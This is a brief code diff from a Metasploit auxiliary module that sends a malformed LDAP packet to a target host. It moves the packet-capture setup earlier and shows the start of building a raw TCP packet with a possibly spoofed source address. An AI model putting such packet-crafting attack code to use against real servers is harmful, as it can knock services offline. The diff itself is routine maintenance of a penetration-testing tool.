@@ -43,11 +43,11 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 
+		open_pcap
+
 		print_status("Sending malformed LDAP packet to #{rhost}")
 
 		m = Rex::Text.rand_text_alpha_lower(3)
-
-		open_pcap
 
 		p = PacketFu::TCPPacket.new
 		p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
